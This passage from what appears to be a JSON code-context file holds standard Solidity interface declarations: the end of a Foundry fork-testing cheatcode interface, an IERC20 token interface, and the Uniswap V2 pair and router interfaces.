function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "Uni_Pair_V2",
                        "content": "interface Uni_Pair_V2 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function MINIMUM_LIQUIDITY() external view returns (uint256);\n\n  function PERMIT_TYPEHASH() external view returns (bytes32);\n\n  function allowance(address, address) external view returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function balanceOf(address) external view returns (uint256);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function decimals() external view returns (uint8);\n\n  function factory() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 _reserve0,\n    uint112 _reserve1,\n    uint32 _blockTimestampLast\n  );\n\n  function initialize(address _token0, address _token1) external;\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function name() external view returns (string memory);\n\n  function nonces(address) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function skim(address to) external;\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes memory data\n  ) external;\n\n  function symbol() external view returns (string memory);\n\n  function sync() external;\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function totalSupply() external view returns (uint256);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "Uni_Router_V2",
                        "content": "interface Uni_Router_V2 {\n  function WETH() external view returns (address);\n\n  function addLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 amountADesired,\n    uint256 amountBDesired,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  returns (\n    uint256 amountA,\n    uint256 amountB,\n    uint256 liquidity\n  );\n\n  function addLiquidityETH(\n    address token,\n    uint256 amountTokenDesired,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  )\n  external\n  payable\n  returns (\n    uint256 amountToken,\n    uint256 amountETH,\n    uint256 liquidity\n  );\n\n  function factory() external view returns (address);\n\n  function getAmountIn(\n    uint256 amountOut,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountIn);\n\n  function getAmountOut(\n    uint256 amountIn,\n    uint256 reserveIn,\n    uint256 reserveOut\n  ) external pure returns (uint256 amountOut);\n\n  function getAmountsIn(uint256 amountOut, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function getAmountsOut(uint256 amountIn, address[] memory path)\n  external\n  view\n  returns (uint256[] memory amounts);\n\n  function quote(\n    uint256 amountA,\n    uint256 reserveA,\n    uint256 reserveB\n  ) external pure returns (uint256 amountB);\n\n  function removeLiquidity(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function removeLiquidityETH(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityETHWithPermit(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountToken, uint256 amountETH);\n\n  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint256 liquidity,\n    uint256 amountTokenMin,\n    uint256 amountETHMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountETH);\n\n  function removeLiquidityWithPermit(\n    address tokenA,\n    address tokenB,\n    uint256 liquidity,\n    uint256 amountAMin,\n    uint256 amountBMin,\n    address to,\n    uint256 deadline,\n    bool approveMax,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external returns (uint256 amountA, uint256 amountB);\n\n  function swapETHForExactTokens(\n    uint256 amountOut,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable returns (uint256[] memory amounts);\n\n  function swapExactETHForTokensSupportingFeeOnTransferTokens(\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external payable;\n\n  function swapExactTokensForETH(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapExactTokensForTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n    uint256 amountIn,\n    uint256 amountOutMin,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external;\n\n  function swapTokensForExactETH(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n\n  function swapTokensForExactTokens(\n    uint256 amountOut,\n    uint256 amountInMax,\n    address[] memory path,\n    address to,\n    uint256 deadline\n  ) external returns (uint256[] memory amounts);\n  // receive () external payable;\n}\n",
                        "token_count": 1172,
                        "imported": true
                    }
                ]
            }
        ]
    }
]